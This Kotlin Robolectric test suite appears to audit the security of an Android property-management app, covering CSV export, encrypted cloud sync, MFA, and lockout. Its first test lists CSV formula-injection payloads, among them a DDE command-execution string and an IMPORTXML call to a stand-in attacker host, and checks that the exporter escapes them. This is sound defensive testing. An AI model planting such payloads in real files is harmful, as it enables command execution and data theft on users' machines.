package com.example

import android.os.Looper
import androidx.room.Room
import androidx.test.core.app.ApplicationProvider
import com.example.base.InMemoryCentralAuthorityTestDouble
import com.example.data.db.OneHomeProDatabase
import com.example.domain.document.ReportExporter
import com.example.domain.security.*
import com.example.domain.service.AccountingService
import com.example.domain.service.AuthResult
import com.example.localization.AppLanguage
import com.example.localization.stringsFor
import com.example.ui.OneHomeProViewModel
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.runBlocking
import org.junit.After
import org.junit.Assert.*
import org.junit.Before
import org.junit.Test
import org.junit.runner.RunWith
import org.robolectric.RobolectricTestRunner
import org.robolectric.Shadows
import org.robolectric.annotation.Config
import java.io.File

@RunWith(RobolectricTestRunner::class)
@Config(sdk = [36])
class SecurityAuditPocRobolectricTest {

    private lateinit var app: OneHomeProApp
    private lateinit var db: OneHomeProDatabase
    private lateinit var central: InMemoryCentralAuthorityTestDouble
    private lateinit var store: SessionStore
    private lateinit var container: AppContainer
    private var activeVm: OneHomeProViewModel? = null

    @Before
    fun setup() {
        app = ApplicationProvider.getApplicationContext()
        db = Room.inMemoryDatabaseBuilder(app, OneHomeProDatabase::class.java)
            .allowMainThreadQueries()
            .build()
        central = InMemoryCentralAuthorityTestDouble()
        store = SessionStore(app, "audit_poc_${System.nanoTime()}")
        container = AppContainer(app, db, central, store)
    }

    @After
    fun tearDown() {
        activeVm?.stopObservers()
        activeVm = null
        Shadows.shadowOf(Looper.getMainLooper()).idle()
        runBlocking(Dispatchers.IO) {
            store.clearSessionToken()
        }
        db.close()
    }

    private fun awaitState(vm: OneHomeProViewModel, predicate: (com.example.ui.OneHomeUiState) -> Boolean) {
        val deadline = System.currentTimeMillis() + 5000L
        while (System.currentTimeMillis() < deadline) {
            Shadows.shadowOf(Looper.getMainLooper()).idle()
            if (predicate(vm.uiState.value)) return
            Thread.sleep(20L)
        }
        Shadows.shadowOf(Looper.getMainLooper()).idle()
        assertTrue("Condition timed out on audit PoC test", predicate(vm.uiState.value))
    }

    @Test
    fun `PoC 1 CSV formula injection payloads are neutralized in ReportExporter`() {
        val payloads = listOf(
            "=CMD|'/C calc'!A0",
            "   =SUM(A1:A2)",
            "+1+1",
            "-2+3",
            "@SUM(1,2)",
            "\t=IMPORTXML(\"http://attacker\",\"//a\")"
        )
        val csvBytes = ReportExporter.buildCsvReport(
            reportTitle = "=1+1 Malicious Title",
            businessName = "@InjectedBusiness",
            lines = payloads,
            generatedAtEpoch = 1_760_000_000_000L
        )
        val csv = String(csvBytes, Charsets.UTF_8)
        assertTrue(csv.contains("\"'=CMD|'/C calc'!A0\""))
        assertTrue(csv.contains("\"'   =SUM(A1:A2)\""))
        assertTrue(csv.contains("\"'+1+1\""))
        assertTrue(csv.contains("\"'-2+3\""))
        assertTrue(csv.contains("\"'@SUM(1,2)\""))
        assertTrue(csv.contains("\"'\t=IMPORTXML"))
        assertTrue(csv.contains("\"'=1+1 Malicious Title\""))
        assertTrue(csv.contains("\"'@InjectedBusiness\""))
    }

    @Test
    fun `PoC 2 cloud business snapshot is AES-256-GCM encrypted before upload with zero plaintext leakage`() = runBlocking {
        central.signInAsTestIdentity("uid_sa", SuperAdminConfig.SUPER_ADMIN_EMAIL, "Super Admin")
        central.bootstrapSuperAdminWithRecovery("StrongOwnerPass#2026", "City?", "Doha", "dev_poc2", "Pixel Audit")
        val centralCheck = central.verifyAndOpenApprovedSession(
            uid = "uid_sa",
            email = SuperAdminConfig.SUPER_ADMIN_EMAIL,
            businessId = null,
            deviceId = "dev_poc2",
            deviceName = "Pixel Audit",
            rememberMe = true
        ) as CentralVerificationResult.Approved
        val setup = container.authService.activateApprovedCentralSession(
            grant = centralCheck.grant,
            business = centralCheck.business,
            serverSessionId = centralCheck.serverSessionId,
            rememberMe = true,
            deviceName = "Pixel Audit",
            isSuperAdmin = true
        )
        val ctx = setup.context

        val secretProp = container.propertyTenancyService.createProperty(
            ctx, "Al Corniche Tower CONFIDENTIAL", "CORN-99", "COMMERCIAL", "Corniche", "Doha", "VIP-NOTE"
        )
        container.propertyTenancyService.createCustomer(
            ctx, "Khalid SecretTenant", "+97455123999", "khalid@secret.qa",
            "29088776655", "QA776655", "Qatari", "Qatar Petroleum", "+97455000011", ""
        )

        val snapshot = container.cloudSyncService.syncBusinessToCloud(ctx, "Pixel Audit", AppLanguage.EN, false)
        assertTrue("Expected encrypted OHPENC1 prefix", snapshot.payloadBase64.startsWith("OHPENC1:"))
        assertFalse("Must NOT store raw gzipped Base64 (H4sI)", snapshot.payloadBase64.removePrefix("OHPENC1:").startsWith("H4sI"))
        assertFalse("Ciphertext must not expose property name", snapshot.payloadBase64.contains("Corniche"))
        assertFalse("Ciphertext must not expose customer name", snapshot.payloadBase64.contains("SecretTenant"))
        assertFalse("Ciphertext must not expose QID number", snapshot.payloadBase64.contains("29088776655"))
        assertFalse("Ciphertext must not expose passport number", snapshot.payloadBase64.contains("QA776655"))

        // Verify decryption fails under wrong passphrase/business key
        val rawCipher = android.util.Base64.decode(snapshot.payloadBase64.removePrefix("OHPENC1:"), android.util.Base64.NO_WRAP)
        val wrongKeyEx = runCatching {
            CryptoUtil.decryptAesGcm(rawCipher, "WRONG-BUSINESS-KEY")
        }.exceptionOrNull()
        assertNotNull("AES-GCM must reject decryption with wrong key", wrongKeyEx)

        // Restore into a completely fresh database
        val cleanDb = Room.inMemoryDatabaseBuilder(app, OneHomeProDatabase::class.java)
            .allowMainThreadQueries()
            .build()
        try {
            val cleanContainer = AppContainer(app, cleanDb, central, SessionStore(app, "clean_${System.nanoTime()}"))
            val restored = cleanContainer.cloudSyncService.restoreBusinessFromCloud(ctx)
            assertNotNull(restored)
            val restoredProp = cleanDb.coreAndTenancyDao().getPropertiesByBusiness(ctx.activeBusinessId).single()
            assertEquals(secretProp.name, restoredProp.name)
            val restoredCust = cleanDb.coreAndTenancyDao().getCustomersByBusiness(ctx.activeBusinessId).single()
            assertEquals("29088776655", restoredCust.qidNumber)
        } finally {
            cleanDb.close()
        }
    }

    @Test
    fun `PoC 3 enableMfaAndGenerateRecoveryCodes returns Base32 TOTP secret and login never leaks code in UI or challenge`() = runBlocking {
        central.preApproveUserForTest("uid_mfa_fix", "mfafix@onehome.qa", "MFA Owner", "OWNER", "biz_mfa", "Al Sadd Estates")
        central.signInAsTestIdentity("uid_mfa_fix", "mfafix@onehome.qa", "MFA Owner")
        val setup = container.authService.setupInitialOwnerAndBusiness(
            fullName = "MFA Owner",
            email = "mfafix@onehome.qa",
            password = "MfaOwnerPass#2026",
            businessName = "Al Sadd Estates",
            branchName = "Al Sadd",
            enableMfa = false,
            rememberMe = false,
            deviceName = "AuditPhone"
        ) as AuthResult.Authenticated

        val (returnedSecret, recoveryCodes) = container.authService.enableMfaAndGenerateRecoveryCodes(setup.context)
        assertEquals(6, recoveryCodes.size)
        assertTrue("Returned key must be Base32 TOTP secret, not a 6-digit code", CryptoUtil.isStandardBase32Secret(returnedSecret))
        assertTrue("Authenticator code from returned secret must verify", CryptoUtil.verifyTotpCode(returnedSecret, CryptoUtil.currentTotpCode(returnedSecret), System.currentTimeMillis()))

        val mfaChallenge = container.authService.login("mfafix@onehome.qa", "MfaOwnerPass#2026", false, "AuditPhone") as AuthResult.MfaRequired
        assertTrue("demoHintInfo must be blank so live OTP is never leaked", mfaChallenge.demoHintInfo.isBlank())

        // Reset OTP notice via ViewModel must not expose raw OTP
        val vm = OneHomeProViewModel(container, splashDelayMs = 0L).also { activeVm = it }
        awaitState(vm) { !it.isInitializing }
        vm.requestPasswordReset("mfafix@onehome.qa")
        awaitState(vm) { it.pendingResetOtpNotice != null && !it.isBusy }
        val notice = vm.uiState.value.pendingResetOtpNotice!!
        assertFalse("Reset notice must not display a 6-digit OTP on screen", Regex("\\b\\d{6}\\b").containsMatchIn(notice))
    }

    @Test
    fun `PoC 4 Super Admin brute-force protection locks out after 5 consecutive failures even for valid password`() = runBlocking {
        central.signInAsTestIdentity("uid_sa_lock", SuperAdminConfig.SUPER_ADMIN_EMAIL, "Jishan Ansari")
        val kit = central.bootstrapSuperAdminWithRecovery("SuperLockMaster#2026", "City?", "Doha", "dev_1", "Pixel")
        val validCode = CryptoUtil.currentTotpCode(kit.totpSecret)

        repeat(4) {
            assertFalse(central.verifySuperAdminChallenge("WrongPassword#00", validCode))
        }
        val lockEx = runCatching {
            central.verifySuperAdminChallenge("WrongPassword#00", validCode)
        }.exceptionOrNull()
        assertTrue("5th failure must throw lockout AuthorizationException", lockEx is AuthorizationException)
        assertTrue(lockEx!!.message!!.contains("Locked", ignoreCase = true))

        // Valid credentials also blocked during lockout window
        val validDuringLockEx = runCatching {
            central.verifySuperAdminChallenge("SuperLockMaster#2026", validCode)
        }.exceptionOrNull()
        assertTrue("Valid credentials must be blocked while lockout active", validDuringLockEx is AuthorizationException)
        assertTrue(central.auditLogs.any { it.action == "SUPER_ADMIN_BRUTE_FORCE_LOCK" })
    }

    @Test
    fun `PoC 5 full 20-module verification smoke across Property, Tenancy, GL Accounting, Vault, Reports, Localization and Double-Submit Guard`() = runBlocking {
        central.signInAsTestIdentity("uid_20mod", SuperAdminConfig.SUPER_ADMIN_EMAIL, "Jishan Ansari")
        val vm = OneHomeProViewModel(container, splashDelayMs = 0L).also { activeVm = it }
        awaitState(vm) { !it.isInitializing }

        // Super Admin bootstrap & verify via ViewModel
        vm.bootstrapSuperAdmin("Master20Mod#2026!")
        awaitState(vm) { it.lastRecoveryKit != null && !it.isBusy }
        val kit = vm.uiState.value.lastRecoveryKit!!
        vm.verifySuperAdminChallenge("Master20Mod#2026!", CryptoUtil.currentTotpCode(kit.totpSecret))
        awaitState(vm) { it.authContext != null && !it.isBusy }
        val ctx = vm.uiState.value.authContext!!

        // Double-submit guard test: duplicate createProperty call while busy triggers only once
        val beforeCount = db.coreAndTenancyDao().getPropertiesByBusiness(ctx.activeBusinessId).size
        vm.createProperty("Pearl Tower 20", "PT-20", "RESIDENTIAL", "Pearl", "Doha", "Audit")
        vm.createProperty("Pearl Tower 20 Duplicate", "PT-DUP", "RESIDENTIAL", "Pearl", "Doha", "Duplicate")
        awaitState(vm) { !it.isBusy && it.data.properties.size == beforeCount + 1 }
        val props = db.coreAndTenancyDao().getPropertiesByBusiness(ctx.activeBusinessId)
        assertEquals(beforeCount + 1, props.size)
        val prop = props.single()

        // Modules 1-4: Building, Floor, Room, Reservation, Inspection
        val bldg = container.propertyTenancyService.addBuilding(ctx, prop.id, "Block B", "BLK-B", 3)
        val fl = container.propertyTenancyService.addFloor(ctx, prop.id, bldg.id, 1, "Level 1")
        val room = container.propertyTenancyService.addRoom(ctx, prop.id, bldg.id, fl.id, "B101", "2BHK", 4, "FURNISHED", 650_000L, "AC", 2, "CARD-B101", "Full")
        val insp = container.propertyTenancyService.recordInspection(ctx, prop.id, room.id, "MOVE_IN", "Clean inspection", 2, 1, false)
        assertEquals("Clean inspection", insp.conditionSummary)

        // Modules 5-10: Tenant, Family, Reservation, Agreement, Monthly Rent, Receipt, Deposit, Cheque
        val tenant = container.propertyTenancyService.createCustomer(ctx, "Mariam Al-Mannai", "+97455889900", "mariam@qatar.qa", "29211223344", "", "Qatari", "Ooredoo", "+97455110022", "")
        val fam = container.propertyTenancyService.addFamilyMember(ctx, tenant.id, "Yusuf", "SON", "21800000001", "")
        val resv = container.propertyTenancyService.reserveRoom(ctx, room.id, tenant.id, 100_000L, 7, "Holding")
        assertTrue(resv.id.isNotBlank() && fam.id.isNotBlank())
        val now = System.currentTimeMillis()
        val ag = container.propertyTenancyService.createAndActivateAgreement(ctx, room.id, tenant.id, "MONTHLY", 650_000L, 0L, 650_000L, now, now + 90L * 86_400_000L, 30, "")
        container.propertyTenancyService.generateRentForPeriod(ctx, now)
        val rent = db.coreAndTenancyDao().getMonthlyRentsByBusiness(ctx.activeBusinessId).first()
        val pmt = container.rentPaymentChequeService.receiveConfirmedPayment(ctx, tenant.id, ag.id, 650_000L, "CASH", null, listOf(rent.id), "Full rent")
        assertEquals(650_000L, pmt.amountFils)

        // Modules 11-12: Double-Entry GL, Bank Account & Trial Balance
        val bank = container.accountingService.createBankAccount(ctx, "QNB", "QNB Corp", "QA58QNBA000000001", 1_000_000L)
        assertTrue(bank.id.isNotBlank())
        val tb = container.accountingService.computeTrialBalance(ctx.activeBusinessId)
        assertEquals(tb.sumOf { it.totalDebitFils }, tb.sumOf { it.totalCreditFils })

        // Modules 13-15: Department, Team, Employee, Attendance, Complaint, Procurement & Inventory
        val dept = container.workforceMaintenanceInventoryService.createDepartment(ctx, "Facilities", "FM")
        val team = container.workforceMaintenanceInventoryService.createTeam(ctx, dept.id, "HVAC Alpha")
        val emp = container.workforceMaintenanceInventoryService.addEmployee(ctx, "Rami", "Technician", dept.id, "+97450004433", "rami@onehome.qa", "28811223344", "Doha", "08:00-17:00")
        val att = container.workforceMaintenanceInventoryService.recordAttendance(ctx, emp.id, "PRESENT", 0, "On time")
        val cmp = container.workforceMaintenanceInventoryService.createComplaint(ctx, prop.id, room.id, tenant.id, "AC Thermostat", "Replace sensor", "HVAC", "HIGH")
        val sup = container.workforceMaintenanceInventoryService.createSupplier(ctx, "Qatar Cooling WLL", "Faisal", "+97444001122", "faisal@cooling.qa", "CR-7788")
        val item = container.workforceMaintenanceInventoryService.createItemCategoryAndItem(ctx, "Electrical", "Thermostat", "SKU-THM1", "PCS", 2L)
        assertTrue(team.id.isNotBlank() && att.id.isNotBlank() && cmp.id.isNotBlank() && sup.id.isNotBlank() && item.id.isNotBlank())

        // Modules 16-20: Encrypted Local Document Vault (AES-GCM on disk), Backup, PDF Export, Alerts, Multi-language
        val samplePdf = ("%PDF-1.4\n%QID-CONFIDENTIAL-29211223344-MARIAM\n%%EOF").toByteArray(Charsets.UTF_8)
        val storedDoc = container.governanceBackupService.storeProcessedDocumentBytes(
            ctx = ctx,
            bytes = samplePdf,
            mimeType = "application/pdf",
            extension = "pdf",
            entityType = "CUSTOMER",
            entityId = tenant.id,
            category = "QID",
            title = "Mariam QID PDF",
            propertyId = prop.id
        )
        val diskBytes = File(storedDoc.privateFilePath).readBytes()
        assertFalse("Vault file on disk must be AES-GCM encrypted, not raw %PDF", String(diskBytes.take(8).toByteArray()).startsWith("%PDF"))
        val (_, decryptedDocBytes) = container.governanceBackupService.readDecryptedDocumentBytes(ctx, storedDoc.id)
        assertTrue(samplePdf.contentEquals(decryptedDocBytes))

        val alertCount = container.governanceBackupService.scanAndGenerateOperationalAlerts(ctx, now)
        assertTrue(alertCount >= 0)
        val pdfBytes = ReportExporter.buildPdfReport("Trial Balance", "ONE HOME PRO HQ", listOf("Cash: QAR 6,500.00"))
        assertTrue(String(pdfBytes.take(8).toByteArray(), Charsets.US_ASCII).startsWith("%PDF-1.4"))

        // Arabic RTL + Hindi + Hinglish localization strings present
        assertTrue(stringsFor(AppLanguage.AR).appName.isNotBlank())
        assertTrue(stringsFor(AppLanguage.HI).navHome.isNotBlank())
        assertTrue(stringsFor(AppLanguage.HI_IN).navHome.isNotBlank())
    }
}
